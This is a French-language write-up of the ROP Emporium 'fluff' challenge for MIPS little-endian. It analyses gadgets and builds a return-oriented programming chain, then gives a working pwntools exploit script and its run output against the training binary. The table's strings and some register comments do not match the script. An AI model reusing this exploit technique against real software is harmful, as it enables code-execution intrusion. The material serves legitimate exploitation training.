---
Title: Ropemporium mipsel fluff
Date: 2023-07-06
Tags: [linux, python, ROP, fluff, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# fluff mipsel

## Introduction.

Le pitch et le matériel de cet exercie se trouve sur cette page du site ropemporium :

[fluff](https://ropemporium.com/challenge/fluff.html)

Dans cet exercice comme dans les deux précédent il faut appeller print_file avec le nom du fichier "flag.txt".
Mais on ne dispose pas de gadget ordinaire.


## Découverte

### Contenu du challenge

    -rw-r--r-- 1 jce jce   33  2 juil.  2020 flag.txt
    -rwxr-xr-x 1 jce jce 7952 15 juil.  2020 fluff_mipsel
    -rwxr-xr-x 1 jce jce 7532 15 juil.  2020 libfluff_mipsel.so

### Première execution

    ./fluff_mipsel 
    fluff by ROP Emporium
    MIPS

    You know changing these strings means I have to rewrite my solutions...
    > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Thank you!
    qemu: uncaught target signal 11 (Segmentation fault) - core dumped
    Erreur de segmentation

## Analyse

### Le programe principal

Comme dans write4 et badchars le programme appelle pwnme et contient un référence à print_file.

            ;-- questionableGadgets:
            0x00400930      0800b98f       lw t9, 8(sp)
            0x00400934      0400ac8f       lw t4, 4(sp)
            0x00400938      26883102       xor s1, s1, s1
            0x0040093c      4100043c       lui a0, 0x41
            0x00400940      702c8434       ori a0, a0, 0x2c70
            0x00400944      09f82003       jalr t9
            0x00400948      0c00bd23       addi sp, sp, 0xc
            0x0040094c      0800b98f       lw t9, 8(sp)
            0x00400950      0400b28f       lw s2, 4(sp)
            0x00400954      41000c3c       lui t4, 0x41  
            0x00400958      742c8c35       ori t4, t4, 0x2c74
            0x0040095c      09f82003       jalr t9
            0x00400960      0c00bd23       addi sp, sp, 0xc
            0x00400964      0400b98f       lw t9, 4(sp)
            0x00400968      26883202       xor s1, s1, s2
            0x0040096c      4100053c       lui a1, 0x41  
            0x00400970      0015a534       ori a1, a1, 0x1500
            0x00400974      09f82003       jalr t9
            0x00400978      0800bd23       addi sp, sp, 8
            0x0040097c      0400b98f       lw t9, 4(sp)
            0x00400980      26801102       xor s0, s0, s1
            0x00400984      26881102       xor s1, s0, s1
            0x00400988      26801102       xor s0, s0, s1
            0x0040098c      41000d3c       lui t5, 0x41  
            0x00400990      0415ad35       ori t5, t5, 0x1504
            0x00400994      09f82003       jalr t9
            0x00400998      0800bd23       addi sp, sp, 8
            0x0040099c      0400b98f       lw t9, 4(sp)
            0x004009a0      000011ae       sw s1, (s0)
            0x004009a4      09f82003       jalr t9
            0x004009a8      0800bd23       addi sp, sp, 8
            0x004009ac      0800a48f       lw a0, 8(sp)
            0x004009b0      0400b98f       lw t9, 4(sp)
            0x004009b4      09f82003       jalr t9
            0x004009b8      0c00bd23       addi sp, sp, 0xc
            0x004009bc      00000000       nop

**s1=0**
- lw t9, 8(sp)
- lw t4, 4(sp)
- xor s1, s1, s1
- lui a0, 0x41
- ori a0, a0, 0x2c70
- jalr t9
- addi sp, sp, 0xc

**set s2**
- lw t9, 8(sp)
- lw s2, 4(sp)
- lui t4, 0x41  
- ori t4, t4, 0x2c74
- jalr t9
- addi sp, sp, 0xc

**s1 = s1^s2**
- lw t9, 4(sp)
- xor s1, s1, s2
- lui a1, 0x41  
- ori a1, a1, 0x1500
- jalr t9
- addi sp, sp, 8

**swap(s0,s1)**
- lw t9, 4(sp)
- xor s0, s0, s1       # s0 = s0_initial^s1
- xor s1, s0, s1       # s1 = s0_initial^s1^s1 = s0_initial
- xor s0, s0, s1       # s0 = s0_initial^s1^s0_initial = s1
- lui t5, 0x41  
- ori t5, t5, 0x1504
- jalr t9
- addi sp, sp, 8

**Gadget d'ecriture de s1 dans [s0]**
- lw t9, 4(sp)
- sw s1, (s0)
- jalr t9
- addi sp, sp, 8

**Gadget d'appel call func(x)**
- lw a0, 8(sp)
- lw t9, 4(sp)
- jalr t9
- addi sp, sp, 0xc
- nop


### La librairie

    readelf --dyn-syms libfluff_mipsel.so |grep -v UND

    La table de symboles « .dynsym » contient 27 entrées :
    Num:    Valeur Tail Type    Lien   Vis      Ndx Nom
        1: 00000650     0 SECTION LOCAL  DEFAULT   11 
        2: 00000860   316 FUNC    GLOBAL DEFAULT   12 pwnme
        3: 00011064     0 NOTYPE  GLOBAL DEFAULT   20 _edata
        4: 00000ba0     0 FUNC    GLOBAL DEFAULT   14 _fini
        5: 00011000     0 NOTYPE  GLOBAL DEFAULT   19 _fdata
        6: 0000099c   260 FUNC    GLOBAL DEFAULT   12 print_file
        7: 00011080     0 NOTYPE  GLOBAL DEFAULT   21 _end
        8: 00011064     0 NOTYPE  GLOBAL DEFAULT   21 __bss_start
        9: 00018ff0     0 SECTION GLOBAL DEFAULT  ABS _gp_disp
        10: 000006e0     0 NOTYPE  GLOBAL DEFAULT   12 _ftext
        11: 00011064     0 NOTYPE  GLOBAL DEFAULT   21 _fbss
        12: 00000650     0 FUNC    GLOBAL DEFAULT   11 _init



La librairie contien la fonction vulnérable pwnme et print_file.


    ┌ 316: sym.pwnme (int32_t arg1, int32_t arg3, int32_t arg_10h, int32_t arg_18h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; arg int32_t arg_18h @ fp+0x18
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_38h @ sp+0x38
    │           ; var int32_t var_3ch @ sp+0x3c
    │           ; arg int32_t arg1 @ a0
    │           ; arg int32_t arg3 @ a2
    │           0x00000860      02001c3c       lui gp, 2
    │           0x00000864      90879c27       addiu gp, gp, -0x7870
    │           0x00000868      21e09903       addu gp, gp, t9
    │           0x0000086c      c0ffbd27       addiu sp, sp, -0x40
    │           0x00000870      3c00bfaf       sw ra, (var_3ch)
    │           0x00000874      3800beaf       sw fp, (var_38h)
    │           0x00000878      25f0a003       move fp, sp
    │           0x0000087c      1000bcaf       sw gp, (var_10h)
    │           0x00000880      4080828f       lw v0, -0x7fc0(gp)          ; [0x11030:4]=0
    │           0x00000884      0000428c       lw v0, (v0)
    │           0x00000888      25380000       move a3, zero
    │           0x0000088c      02000624       addiu a2, zero, 2           ; arg3
    │           0x00000890      25280000       move a1, zero
    │           0x00000894      25204000       move a0, v0
    │           0x00000898      4880828f       lw v0, -sym.imp.setvbuf(gp) ; [0x11038:4]=0xb60 sym.imp.setvbuf
    │           0x0000089c      25c84000       move t9, v0
    │           0x000008a0      09f82003       jalr t9
    │           0x000008a4      00000000       nop
    │           0x000008a8      1000dc8f       lw gp, (var_10h)
    │           0x000008ac      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x000008b0      f00b4424       addiu a0, v0, str.fluff_by_ROP_Emporium ; 0xbf0 ; "fluff by ROP Emporium" ; arg1
    │           0x000008b4      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xb40 sym.imp.puts
    │           0x000008b8      25c84000       move t9, v0
    │           0x000008bc      09f82003       jalr t9
    │           0x000008c0      00000000       nop
    │           0x000008c4      1000dc8f       lw gp, (var_10h)
    │           0x000008c8      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x000008cc      080c4424       addiu a0, v0, str.MIPS_n    ; 0xc08 ; "MIPS\n" ; arg1
    │           0x000008d0      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xb40 sym.imp.puts
    │           0x000008d4      25c84000       move t9, v0
    │           0x000008d8      09f82003       jalr t9
    │           0x000008dc      00000000       nop
    │           0x000008e0      1000dc8f       lw gp, (var_10h)
    │           0x000008e4      20000624       addiu a2, zero, 0x20        ; arg3
    │           0x000008e8      25280000       move a1, zero
    │           0x000008ec      1800c227       addiu v0, fp, 0x18
    │           0x000008f0      25204000       move a0, v0
    │           0x000008f4      4480828f       lw v0, -sym.imp.memset(gp)  ; [0x11034:4]=0xb70 sym.imp.memset
    │           0x000008f8      25c84000       move t9, v0
    │           0x000008fc      09f82003       jalr t9
    │           0x00000900      00000000       nop
    │           0x00000904      1000dc8f       lw gp, (var_10h)
    │           0x00000908      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x0000090c      100c4424       addiu a0, v0, str.You_know_changing_these_strings_means_I_have_to_rewrite_my_solutions... ;
    │           0x00000910      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xb40 sym.imp.puts
    │           0x00000914      25c84000       move t9, v0
    │           0x00000918      09f82003       jalr t9
    │           0x0000091c      00000000       nop
    │           0x00000920      1000dc8f       lw gp, (var_10h)
    │           0x00000924      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x00000928      580c4424       addiu a0, v0, 0xc58         ; arg1
    │           0x0000092c      6080828f       lw v0, -sym.imp.printf(gp)  ; [0x11050:4]=0xb10 sym.imp.printf
    │           0x00000930      25c84000       move t9, v0
    │           0x00000934      09f82003       jalr t9
    │           0x00000938      00000000       nop
    │           0x0000093c      1000dc8f       lw gp, (var_10h)
    │           0x00000940      00020624       addiu a2, zero, 0x200       ; arg3
    │           0x00000944      1800c227       addiu v0, fp, 0x18
    │           0x00000948      25284000       move a1, v0
    │           0x0000094c      25200000       move a0, zero
    │           0x00000950      6880828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x11058:4]=0xb00 sym.imp.read
    │           0x00000954      25c84000       move t9, v0
    │           0x00000958      09f82003       jalr t9
    │           0x0000095c      00000000       nop
    │           0x00000960      1000dc8f       lw gp, (var_10h)
    │           0x00000964      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x00000968      5c0c4424       addiu a0, v0, str.Thank_you_ ; 0xc5c ; "Thank you!" ; arg1
    │           0x0000096c      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xb40 sym.imp.puts
    │           0x00000970      25c84000       move t9, v0
    │           0x00000974      09f82003       jalr t9
    │           0x00000978      00000000       nop
    │           0x0000097c      1000dc8f       lw gp, (var_10h)
    │           0x00000980      00000000       nop
    │           0x00000984      25e8c003       move sp, fp
    │           0x00000988      3c00bf8f       lw ra, (var_3ch)
    │           0x0000098c      3800be8f       lw fp, (var_38h)
    │           0x00000990      4000bd27       addiu sp, sp, 0x40
    │           0x00000994      0800e003       jr ra
    └           0x00000998      00000000       nop

La lecture se fait dans un buffer de 512 octets et le débordement à lieu après 0x24 octets comme pour write4.
( cf article write 4 )



### Etude des gadgets

Pour ecrire en memoire

On trouve ce gadget qui fait partie de "quesionnableGadgets" 

    0x0040099c : lw $t9, 4($sp) ; sw $s1, ($s0) ; jalr $t9 ; addi $sp, $sp, 8

Il nous faut contrôler `s0` et `s1`.

Pour cela on trouve avec : **# ROPgadget --binary fluff_mipsel |grep "lw \$a0"**

    0x00400aac : lw $ra, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x28

Le gadget va chercher relativement loin les valeurs sur la pile et effectue un ajustement de 0x28 (80) octets, 10 mots sur la pile ce qui est pas mal d'autant qu'on doit l'utiliser deux fois.
ON devra insérer des mots de junk dans la chaine.
Mais on a de la place (512 octets)

Appel de print_file.

En recherchant "ROPgadget --binary fluff_mipsel |grep "lw \$a0"
On trouve le gadget déjà vu dans quesionnableGadgets.

    0x004009ac : lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; addi $sp, $sp, 0xc

### La chaine de ROP

| ROP entry | gadget | comment |
| ----------- | ------- | ----- |
| ---------- | Ecriture de "flbd" dans .bss|
| 0x00400aac | lw $ra, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x28 | charge s0,s1
| 0xdeadbeef | | junk | 7 junks
| 0xdeadbeef | | junk |
| 0xdeadbeef | | junk |
| 0xdeadbeef | | junk |
| 0xdeadbeef | | junk |
| 0xdeadbeef | | junk |
| 0xdeadbeef | | junk |
| 0x00411070 | @.bss | pour `s0` 
| 0x67626c66 | 'flbd' | pour `s1`
| 0x0040099c | lw $t9, 4($sp) ; sw $s1, ($s0) ; jalr $t9 ; addi $sp, $sp, 8 | Pour `t9` du gadget de chargement
| 0xdeadbeef | | junk |
| ---------- | Ecriture de "-t{t"" dans .bss+4
| 0x00400aac | lw $ra, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x28 | charge s0,s1
| 0xdeadbeef | | junk | 7 junks
| 0xdeadbeef | | junk |
| 0xdeadbeef | | junk |
| 0xdeadbeef | | junk |
| 0xdeadbeef | | junk |
| 0xdeadbeef | | junk |
| 0xdeadbeef | | junk |
| 0x00411074 | @.bss+4 | pour `s0` 
| 0x747b742d | '-t{t' | pour `t1`
| 0x0040099c | lw $t9, 4($sp) ; sw $s1, ($s0) ; jalr $t9 ; addi $sp, $sp, 8 | Pour `t9` du gadget de chargement
| 0xdeadbeef | | junk |
| ----------| Appel print_file(@.bss)
| 0x004009ac | lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; addi $sp, $sp, 0xc | Charge `a0` et appel @`t9`
| 0xdeadbeef | | junk |
| 0x00400af0 | print_file@plt | pour `t9` 
| 0x00411070 | @.bss | pour `a0` 

## Exploitation

### Script python

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time


# ROPemporium fluff MIPSEL

# Set up pwntools for the correct architecture
elf = context.binary = ELF('fluff_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

# ret : 296
# read  : 248
gs='''
b *pwnme+296
c
'''

# Gadgets
# 0x00400aac : lw $ra, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x28
g_pop_s1s0= 0x00400aac

# 0x0040099c : lw $t9, 4($sp) ; sw $s1, ($s0) ; jalr $t9 ; addi $sp, $sp, 8
g_write_s1s0 = 0x0040099c

g_call_with_a0 = 0x004009ac

def write_word( what, where):
    pl=p32(g_pop_s1s0)    
    pl+=p32(0xdeadbeef)        # junk
    pl+=p32(0xdeadbeef)        # junk
    pl+=p32(0xdeadbeef)        # junk
    pl+=p32(0xdeadbeef)        # junk
    pl+=p32(0xdeadbeef)        # junk
    pl+=p32(0xdeadbeef)        # junk
    pl+=p32(0xdeadbeef)        # junk
    pl+=where                  # t0
    pl+=what                   # t1
    pl+=p32(g_write_s1s0)      # t9 => next gadget
    pl+=p32(0xdeadbeef)        # junk
    return pl


if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


print_file = elf.plt["print_file"]+4
bssaddr = elf.get_section_by_name('.bss').header['sh_addr']

log.info(f"{bssaddr=:x}")
log.info(f"{print_file=:x}")

offset=0x24

PL=b"A"*offset

PL+=write_word(b'flag', p32(bssaddr))
PL+=write_word(b'.txt', p32(bssaddr+4))

# This line is read by prio gadget
PL+=p32(g_call_with_a0)    # t9 => next gadget for g_write_s1s0
PL+=p32(0xdeadbeef)        # junk
PL+=p32(print_file)        # t9 for g_call_with_a0
PL+=p32(bssaddr)           # t0 for g_call_with_a0

log.info(f"Payload size : 0x{len(PL):x}")
log.info(PL.hex())
io.sendlineafter(b"> ",PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()
````

### Déroulement

```console
python3 solve.py 
[*] '/home/jce/w/ropemporium/mipsel/06_fluff/fluff_mipsel'
    Arch:     mips-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/jce/w/ropemporium/mipsel/06_fluff/fluff_mipsel': pid 7198
[*] bssaddr=411070
[*] print_file=400af0
[*] Payload size : 0x94
[*] 414141414141414141414141414141414141414141414141414141414141414141414141ac0a4000efbeaddeefbeaddeefbeaddeefbeaddeefbeaddeefbeaddeefbeadde70104100666c61679c094000efbeaddeac0a4000efbeaddeefbeaddeefbeaddeefbeaddeefbeaddeefbeaddeefbeadde741041002e7478749c094000efbeaddeac094000efbeaddef00a400070104100
[+] flag : ROPE{a_placeholder_32byte_flag!}
[*] Stopped process '/home/jce/w/ropemporium/mipsel/06_fluff/fluff_mipsel' (pid 7198)
```